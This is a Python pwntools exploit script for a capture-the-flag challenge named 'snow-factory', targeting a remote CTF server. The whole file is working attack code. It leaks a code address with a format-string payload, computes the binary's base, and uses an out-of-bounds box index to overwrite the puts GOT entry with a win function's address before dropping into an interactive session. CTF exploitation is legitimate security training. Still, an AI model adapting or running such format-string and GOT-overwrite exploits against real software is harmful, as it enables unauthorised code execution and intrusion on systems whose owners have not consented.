from pwn import *

context.update(arch='amd64', os='linux')
exe = './snow-factory/snow_factory'
elf = ELF(exe, checksec=False)

OFFSET_MAIN = 0x1243
OFFSET_WIN = 0x1229
OFFSET_PUTS_GOT = 0x4008
OFFSET_BOXES = 0x4080

def exploit():
    try:
        p = remote('snow-factory.julec.tf', 1337, ssl=True)
        p.sendlineafter(b"What's your name: ", b'%25$p')
        p.recvuntil(b"Hello ")
        leak_str = p.recvline().decode().strip()
        leak_addr = int(leak_str, 16)
        
        base_addr = leak_addr - OFFSET_MAIN
        win_addr = base_addr + OFFSET_WIN
        
        log.info(f"Leak: {hex(leak_addr)}")
        log.info(f"Base: {hex(base_addr)}")
        log.info(f"Win: {hex(win_addr)}")
        
        target_addr = base_addr + OFFSET_PUTS_GOT
        start_addr = base_addr + OFFSET_BOXES
        index = (target_addr - start_addr) // 8
        
        log.info(f"Target index: {index}")
        
        p.sendlineafter(b"Which box do you want to put your present in:", str(index).encode())
        p.sendlineafter(b"What present number do you want to put in:", str(win_addr).encode())
        
        p.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
